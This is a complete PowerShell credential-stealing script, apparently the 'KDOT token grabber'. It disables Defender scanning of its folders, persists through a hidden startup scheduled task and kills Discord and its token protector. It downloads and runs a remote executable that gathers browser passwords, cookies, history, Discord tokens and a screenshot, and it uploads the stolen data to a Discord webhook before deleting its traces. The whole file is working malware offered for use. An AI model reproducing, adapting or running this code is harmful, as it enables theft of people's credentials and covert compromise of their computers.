function CHECK_IF_ADMIN {
    $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator); echo $test
}

function TASKS {
    $test_KDOT = Test-Path -Path "$env:APPDATA\KDOT"
    if ($test_KDOT -eq $false) {
        try {
            Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
            Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
        } catch {
            Write-Host "Failed to add exclusions"
        }
        New-Item -ItemType Directory -Path "$env:APPDATA\KDOT"
        $origin = $PSCommandPath
        Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1"
    }
    $test = Get-ScheduledTask | Select-Object -ExpandProperty TaskName
    if ($test -contains "KDOT") {
        Write-Host "KDOT already exists"
    } else {
        $schedule = New-ScheduledTaskTrigger -AtStartup
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle hidden -File $env:APPDATA\KDOT\KDOT.ps1"
        Register-ScheduledTask -TaskName "KDOT" -Trigger $schedule -Action $action -RunLevel Highest -Force
    }
    Grub
}

function Grub {
    $webhook = "YOUR_WEBHOOK_HERE"
    $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
    $ip = $ip.Content
    $ip > $env:LOCALAPPDATA\Temp\ip.txt
    $system_info = systeminfo.exe > $env:LOCALAPPDATA\Temp\system_info.txt
    $uuid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID 
    $uuid > $env:LOCALAPPDATA\Temp\uuid.txt
    $mac = Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Select-Object -ExpandProperty MACAddress
    $mac > $env:LOCALAPPDATA\Temp\mac.txt
    $username = $env:USERNAME
    $hostname = $env:COMPUTERNAME
    $netstat = netstat -ano > $env:LOCALAPPDATA\Temp\netstat.txt

    $embed_and_body = @{
        "username" = "KDOT"
        "content" = "@everyone"
        "title" = "KDOT"
        "description" = "KDOT"
        "color" = "16711680"
        "avatar_url" = "https://cdn.discordapp.com/avatars/1009510570564784169/c4079a69ab919800e0777dc2c01ab0da.png"
        "url" = "https://discord.gg/vk3rBhcj2y"
        "embeds" = @(
            @{
                "title" = "SOMALI GRABBER"
                "url" = "https://discord.gg/vk3rBhcj2y"
                "description" = "New person grabbed using KDOT's TOKEN GRABBER"
                "color" = "16711680"
                "footer" = @{
                    "text" = "Made by KDOT and GODFATHER"
                }
                "thumbnail" = @{
                    "url" = "https://cdn.discordapp.com/avatars/1009510570564784169/c4079a69ab919800e0777dc2c01ab0da.png"
                }
                "fields" = @(
                    @{
                        "name" = "IP"
                        "value" = "``````$ip``````"
                    },
                    @{
                        "name" = "Username"
                        "value" = "``````$username``````"
                    },
                    @{
                        "name" = "Hostname"
                        "value" = "``````$hostname``````"
                    },
                    @{
                        "name" = "UUID"
                        "value" = "``````$uuid``````"
                    },
                    @{
                        "name" = "MAC"
                        "value" = "``````$mac``````"
                    }
                )
            }
        )
    }

    $payload = $embed_and_body | ConvertTo-Json -Depth 10
    Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null

    Set-Location $env:LOCALAPPDATA\Temp

    taskkill.exe /f /im "Discord.exe" | Out-Null
    taskkill.exe /f /im "DiscordCanary.exe" | Out-Null
    taskkill.exe /f /im "DiscordPTB.exe" | Out-Null
    taskkill.exe /f /im "DiscordTokenProtector.exe" | Out-Null


    $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
    if ($token_prot -eq $true) {
        Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force
    }

    $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat"
    if ($secure_dat -eq $true) {
        Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force
    }

    $TEMP_KOT = Test-Path "$env:LOCALAPPDATA\Temp\KDOT"
    if ($TEMP_KOT -eq $false) {
        New-Item "$env:LOCALAPPDATA\Temp\KDOT" -Type Directory
    }
    $gotta_make_sure = "penis"; Set-Content -Path "$env:LOCALAPPDATA\Temp\KDOT\bruh.txt" -Value "$gotta_make_sure"

    Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/main.exe" -OutFile "main.exe" -UseBasicParsing

    $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
    $proc.WaitForExit()

    $lol = "$env:LOCALAPPDATA\Temp"
    Move-Item -Path "$lol\ip.txt" -Destination "$lol\KDOT\ip.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$lol\netstat.txt" -Destination "$lol\KDOT\netstat.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$lol\system_info.txt" -Destination "$lol\KDOT\system_info.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$lol\uuid.txt" -Destination "$lol\KDOT\uuid.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$lol\mac.txt" -Destination "$lol\KDOT\mac.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$lol\browser-cookies.txt" -Destination "$lol\KDOT\browser-cookies.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$lol\browser-history.txt" -Destination "$lol\KDOT\browser-history.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$lol\browser-passwords.txt" -Destination "$lol\KDOT\browser-passwords.txt" -ErrorAction SilentlyContinue
    Move-Item -Path "$lol\desktop-screenshot.png" -Destination "$lol\KDOT\desktop-screenshot.png" -ErrorAction SilentlyContinue
    Move-Item -Path "$lol\tokens.txt" -Destination "$lol\KDOT\tokens.txt" -ErrorAction SilentlyContinue
    Compress-Archive -Path "$lol\KDOT" -DestinationPath "$lol\KDOT.zip" -Force
    #Invoke-WebRequest -Uri "$webhook" -Method Post -InFile "$lol\KDOT.zip" -ContentType "multipart/form-data"
    #curl.exe -X POST -H "Content-Type: multipart/form-data" -F "file=@$lol\KDOT.zip" $webhook
    curl.exe -X POST -F 'payload_json={\"username\": \"KING KDOT\", \"content\": \"\", \"avatar_url\": \"https://cdn.discordapp.com/avatars/1009510570564784169/c4079a69ab919800e0777dc2c01ab0da.png\"}' -F "file=@$lol\KDOT.zip" $webhook
    Remove-Item "$lol\KDOT.zip"
    Remove-Item "$lol\KDOT" -Recurse
    Remove-Item "$lol\main.exe"
}

if (CHECK_IF_ADMIN -eq $true) {
    TASKS
    #pause
} else {
    Write-Host ("Please run as admin!") -ForegroundColor Red
    $origin = $MyInvocation.MyCommand.Path
    Start-Process powershell.exe -ArgumentList "-noprofile -file $origin" -verb RunAs
}
